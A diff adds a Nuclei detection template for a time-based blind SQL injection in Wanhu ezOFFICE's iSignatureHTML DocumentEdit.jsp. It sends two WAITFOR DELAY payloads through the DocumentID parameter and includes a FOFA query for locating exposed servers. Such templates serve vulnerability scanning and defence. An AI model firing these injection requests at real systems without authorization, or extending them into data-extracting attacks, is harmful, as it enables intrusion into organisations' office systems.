@@ -1,0 +1,41 @@
+id: wanhu-ezoffice-isignaturehtml-documentedit-sqli-time-based
+
+info:
+  name: "万户 iSignatureHTML DocumentEdit 接口 SQL 注入漏洞（双时间盲注确认版）"
+  author: xiuxin
+  severity: critical
+  tags: wanhu-ezoffice
+  metadata:
+    fofa-query: app="万户网络-ezOFFICE"
+    verified: true
+    max-request: 2
+
+http:
+  - raw:
+      # -------------------------
+      # 1️⃣ 5秒延时
+      # -------------------------
+      - |
+        @timeout: 15s
+        GET /defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp;?DocumentID=1'%20WAITFOR%20DELAY%20'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+      # -------------------------
+      # 2️⃣ 8秒延时
+      # -------------------------
+      - |
+        @timeout: 15s
+        GET /defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp;?DocumentID=1'%20WAITFOR%20DELAY%20'0:0:8'-- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - "status_code_2 == 200"
+          - "duration_1 >= 5 && duration_1 <= 7"
+          - "duration_2 >= 8 && duration_2 <= 10"
+          - "duration_2 - duration_1 >= 2"
+        condition: and
